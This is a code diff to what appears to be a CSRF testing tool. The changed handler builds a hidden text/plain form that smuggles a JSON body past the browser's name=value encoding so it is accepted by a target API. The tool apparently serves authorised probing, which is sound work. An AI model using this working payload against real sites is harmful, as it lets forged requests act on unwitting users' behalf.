@@ -68,13 +68,23 @@ document.body.appendChild(f)`),
   '/form': (url, q) => page('form', { url, body: q.get('body') || '{"probe":"csrf"}', top: q.get('top') === '1' }, `
 let obj; try { obj = JSON.parse(C.body) } catch { out('body must be a JSON object'); throw new Error('bad body') }
 if (obj === null || typeof obj !== 'object' || Array.isArray(obj)) { out('body must be a JSON object'); throw new Error('bad body') }
-// text/plain form trick: the browser sends name + "=" + value. Split the JSON so the "=" lands at
-// the end of the last string field ({"message":"hi"} -> {"message":"hi="}) and no field is added,
-// so a strict schema does not reject the probe for an unrelated reason. Otherwise add "_pad".
-const json = JSON.stringify(obj)
-let head, tail
-if (json.endsWith('"}')) { head = json.slice(0, -2); tail = '"}' }
-else { head = json.slice(0, -1) + (json === '{}' ? '' : ',') + '"_pad":"'; tail = '"}' }
+// text/plain form trick: the browser sends name + "=" + value. Move a top-level string field to
+// the end and split there, so the "=" lands at the end of its value ({"message":"hi","stream":false}
+// -> {"stream":false,"message":"hi="}) and no field is added: a strict schema then has no unrelated
+// reason to reject the probe. The JSON is built by hand so a "__proto__" key stays a plain field.
+const entries = Object.entries(obj)
+const i = entries.map(([, v]) => typeof v).lastIndexOf('string')
+let head, tail = '"}'
+if (i >= 0) {
+  const ordered = entries.filter((_, j) => j !== i).concat([entries[i]])
+  const json = '{' + ordered.map(([k, v]) => JSON.stringify(k) + ':' + JSON.stringify(v)).join(',') + '}'
+  head = json.slice(0, -2)
+  out('the "=" goes at the end of the string field ' + JSON.stringify(entries[i][0]))
+} else {
+  const json = JSON.stringify(obj)
+  head = json.slice(0, -1) + (json === '{}' ? '' : ',') + '"_pad":"'
+  out('no string field to carry the "=": added "_pad". If the API rejects unknown fields, report that a schema-valid CSRF probe could not be built for this endpoint')
+}
 const form = document.createElement('form'); form.method = 'POST'; form.action = C.url; form.enctype = 'text/plain'
 const input = document.createElement('input'); input.type = 'hidden'; input.name = head; input.value = tail; form.appendChild(input)
 if (!C.top) {
